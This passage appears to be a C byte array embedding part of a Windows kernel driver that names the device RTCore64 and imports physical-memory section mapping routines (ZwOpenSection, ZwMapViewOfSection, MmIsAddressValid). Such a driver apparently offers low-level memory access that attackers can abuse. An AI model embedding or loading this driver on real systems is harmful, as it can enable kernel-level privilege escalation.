  0x83, 0x00, 0x00, 0x00, 0xb0, 0x00, 0x00, 0x00, 0xd9, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,
  0x2d, 0x01, 0x00, 0x00, 0x56, 0x01, 0x00, 0x00, 0x37, 0x02, 0x00, 0x00, 0x69, 0x02, 0x00, 0x00,
  0xac, 0x02, 0x00, 0x00, 0xff, 0x02, 0x00, 0x00, 0x3a, 0x03, 0x00, 0x00, 0x6b, 0x03, 0x00, 0x00,
  0x9c, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x0f, 0x0f, 0x01, 0x0f, 0x0f, 0x0f, 0x02, 0x0f, 0x0f, 0x0f,
  0x03, 0x0f, 0x0f, 0x0f, 0x04, 0x0f, 0x0f, 0x0f, 0x05, 0x0f, 0x0f, 0x0f, 0x06, 0x0f, 0x0f, 0x0f,
  0x07, 0x0f, 0x0f, 0x0f, 0x0f, 0x0f, 0x0f, 0x0f, 0x08, 0x0f, 0x0f, 0x0f, 0x09, 0x0f, 0x0f, 0x0f,
  0x0a, 0x0f, 0x0f, 0x0f, 0x0b, 0x0f, 0x0f, 0x0f, 0x0c, 0x0f, 0x0f, 0x0f, 0x0d, 0x0f, 0x0f, 0x0f,
  0x0e, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
  0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x48, 0x83, 0xec, 0x28,
  0x48, 0x8b, 0xea, 0x41, 0xbd, 0x01, 0x00, 0x00, 0x00, 0x41, 0x8b, 0xc5, 0x48, 0x83, 0xc4, 0x28,
  0x5d, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc,
  0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x48, 0x83, 0xec, 0x28,
  0x48, 0x8b, 0xea, 0x41, 0xbd, 0x01, 0x00, 0x00, 0x00, 0x41, 0x8b, 0xc5, 0x48, 0x83, 0xc4, 0x28,
  0x5d, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc,
  0x53, 0x48, 0x83, 0xec, 0x70, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0x51, 0x14, 0x00, 0x00, 0x48,
  0x8d, 0x4c, 0x24, 0x48, 0xff, 0x15, 0x26, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x0f, 0x14, 0x00,
  0x00, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0xff, 0x15, 0x14, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x44, 0x24,
  0x40, 0x48, 0x89, 0x44, 0x24, 0x30, 0xc6, 0x44, 0x24, 0x28, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x00,
  0x00, 0x00, 0x00, 0x41, 0xb9, 0x22, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x48, 0x33, 0xd2,
  0x48, 0x8b, 0xcb, 0xff, 0x15, 0x37, 0x04, 0x00, 0x00, 0x85, 0xc0, 0x7c, 0x3a, 0x48, 0x8d, 0x54,
  0x24, 0x48, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0xff, 0x15, 0x1b, 0x04, 0x00, 0x00, 0x85, 0xc0, 0x7c,
  0x26, 0x48, 0x8d, 0x05, 0x68, 0xfa, 0xff, 0xff, 0x48, 0x89, 0x43, 0x70, 0x48, 0x89, 0x83, 0x80,
  0x00, 0x00, 0x00, 0x48, 0x89, 0x83, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05, 0x9f, 0xf7, 0xff,
  0xff, 0x48, 0x89, 0x43, 0x68, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xff, 0x25,
  0xf4, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xe0, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xea, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x0c, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3e, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd2, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x66, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x90, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa8, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xc0, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xc0, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x01, 0x09, 0x01, 0x00, 0x09, 0x42, 0x00, 0x00, 0x01, 0x09, 0x01, 0x00, 0x09, 0x42, 0x00, 0x00,
  0x01, 0x05, 0x02, 0x00, 0x05, 0x52, 0x01, 0x30, 0x01, 0x0e, 0x07, 0x00, 0x0e, 0x01, 0x1a, 0x00,
  0x07, 0xd0, 0x05, 0xc0, 0x03, 0x70, 0x02, 0x60, 0x01, 0x30, 0x00, 0x00, 0x01, 0x10, 0x09, 0x00,
  0x10, 0x42, 0x0c, 0x50, 0x0b, 0xf0, 0x09, 0xe0, 0x07, 0xd0, 0x05, 0xc0, 0x03, 0x70, 0x02, 0x60,
  0x01, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x10, 0x09, 0x00,
  0x10, 0x42, 0x0c, 0x50, 0x0b, 0xf0, 0x09, 0xe0, 0x07, 0xd0, 0x05, 0xc0, 0x03, 0x70, 0x02, 0x60,
  0x01, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x14, 0x08, 0x00,
  0x14, 0x52, 0x10, 0xf0, 0x0e, 0xe0, 0x0c, 0xd0, 0x0a, 0xc0, 0x08, 0x70, 0x07, 0x60, 0x06, 0x30,
  0x6e, 0x1c, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xd2, 0x19, 0x00, 0x00, 0x03, 0x1a, 0x00, 0x00,
  0xa0, 0x1b, 0x00, 0x00, 0x03, 0x1a, 0x00, 0x00, 0x25, 0x1a, 0x00, 0x00, 0x44, 0x1a, 0x00, 0x00,
  0x70, 0x1b, 0x00, 0x00, 0x44, 0x1a, 0x00, 0x00, 0x01, 0x05, 0x02, 0x00, 0x05, 0xd2, 0x01, 0x30,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x5c, 0x00, 0x44, 0x00, 0x6f, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00,
  0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x52, 0x00, 0x54, 0x00, 0x43, 0x00, 0x6f, 0x00,
  0x72, 0x00, 0x65, 0x00, 0x36, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x5c, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5c, 0x00,
  0x52, 0x00, 0x54, 0x00, 0x43, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x65, 0x00, 0x36, 0x00, 0x34, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x10, 0x00, 0x00, 0x43, 0x12, 0x00, 0x00, 0x80, 0x20, 0x00, 0x00, 0x50, 0x12, 0x00, 0x00,
  0xfa, 0x13, 0x00, 0x00, 0x88, 0x20, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x35, 0x14, 0x00, 0x00,
  0x90, 0x20, 0x00, 0x00, 0x40, 0x14, 0x00, 0x00, 0x73, 0x16, 0x00, 0x00, 0x98, 0x20, 0x00, 0x00,
  0xb0, 0x16, 0x00, 0x00, 0x61, 0x1b, 0x00, 0x00, 0xec, 0x20, 0x00, 0x00, 0x70, 0x1b, 0x00, 0x00,
  0x9d, 0x1b, 0x00, 0x00, 0xcc, 0x20, 0x00, 0x00, 0xa0, 0x1b, 0x00, 0x00, 0xcd, 0x1b, 0x00, 0x00,
  0xac, 0x20, 0x00, 0x00, 0xd0, 0x1b, 0x00, 0x00, 0x6d, 0x1c, 0x00, 0x00, 0x28, 0x21, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x50, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd2, 0x51, 0x00, 0x00,
  0x10, 0x20, 0x00, 0x00, 0x40, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xfa, 0x51, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xe0, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xea, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x0c, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3e, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd2, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x66, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7c, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x90, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa8, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xc0, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4e, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xc0, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x4a, 0x01, 0x49, 0x6f, 0x44, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
  0x00, 0x00, 0x4c, 0x01, 0x49, 0x6f, 0x44, 0x65, 0x6c, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6d, 0x62,
  0x6f, 0x6c, 0x69, 0x63, 0x4c, 0x69, 0x6e, 0x6b, 0x00, 0x00, 0x12, 0x04, 0x52, 0x74, 0x6c, 0x49,
  0x6e, 0x69, 0x74, 0x55, 0x6e, 0x69, 0x63, 0x6f, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67,
  0x00, 0x00, 0xf7, 0x04, 0x5a, 0x77, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x00, 0x19, 0x05, 0x5a, 0x77,
  0x4d, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4f, 0x66, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e,
  0x00, 0x00, 0x27, 0x03, 0x4f, 0x62, 0x52, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x4f,
  0x62, 0x6a, 0x65, 0x63, 0x74, 0x42, 0x79, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x00, 0x25, 0x05,
  0x5a, 0x77, 0x4f, 0x70, 0x65, 0x6e, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x67, 0x05,
  0x5f, 0x5f, 0x43, 0x5f, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x5f, 0x68, 0x61, 0x6e,
  0x64, 0x6c, 0x65, 0x72, 0x00, 0x00, 0xdf, 0x01, 0x49, 0x6f, 0x66, 0x43, 0x6f, 0x6d, 0x70, 0x6c,
  0x65, 0x74, 0x65, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x00, 0xa3, 0x02, 0x4d, 0x6d,
  0x49, 0x73, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x56, 0x61, 0x6c, 0x69, 0x64, 0x00, 0x00,
  0x62, 0x05, 0x5a, 0x77, 0x55, 0x6e, 0x6d, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4f, 0x66, 0x53,
  0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x00, 0x00, 0x40, 0x01, 0x49, 0x6f, 0x43, 0x72, 0x65, 0x61,
  0x74, 0x65, 0x53, 0x79, 0x6d, 0x62, 0x6f, 0x6c, 0x69, 0x63, 0x4c, 0x69, 0x6e, 0x6b, 0x00, 0x00,
  0x37, 0x01, 0x49, 0x6f, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
  0x00, 0x00, 0x6e, 0x74, 0x6f, 0x73, 0x6b, 0x72, 0x6e, 0x6c, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00,
  0x30, 0x00, 0x48, 0x61, 0x6c, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x6c, 0x61, 0x74, 0x65, 0x42, 0x75,
  0x73, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x48, 0x41, 0x4c, 0x2e, 0x64, 0x6c,
  0x6c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
